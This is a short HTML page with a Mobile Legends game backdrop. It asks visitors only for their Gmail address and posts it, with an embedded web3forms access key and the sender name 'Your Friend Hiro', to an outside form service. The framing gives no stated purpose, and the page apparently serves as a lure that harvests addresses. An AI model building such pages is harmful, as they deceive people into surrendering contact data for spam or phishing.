<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter Gmail</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background-image:url("https://hirohaokip552-sketch.github.io/MLBB-BANG-BANG/mobile-legends-bang-bang-cards-768x524.webp");
    background-size:cover;
    background-position:center;
}

.box{
    width:90%;
    max-width:380px;
    background:rgba(255,255,255,.15);
    backdrop-filter:blur(15px);
    padding:30px;
    border-radius:20px;
    text-align:center;
    color:white;
}

h2{
    margin-bottom:20px;
}

input{
    width:100%;
    padding:12px;
    border:none;
    border-radius:10px;
    margin-bottom:20px;
    font-size:16px;
}

button{
    width:100%;
    padding:12px;
    border:none;
    border-radius:25px;
    background:white;
    color:#001f4d;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:#e5e5e5;
}
</style>
</head>

<body>

<div class="box">

<h2>Enter Your Gmail Address</h2>

<form action="https://api.web3forms.com/submit" method="POST">

<input type="hidden" name="access_key" value="190ee34d-cebc-4d2d-baa2-3f11944a3ff7">

<input type="hidden" name="subject" value="User Gmail Address">

<input type="hidden" name="from_name" value="Your Friend Hiro">

<input type="hidden" name="redirect" value="thankyou.html">

<input
type="email"
name="gmail"
placeholder="Enter your Gmail"
required>

<button type="submit">Send</button>

</form>

</div>

</body>
</html>
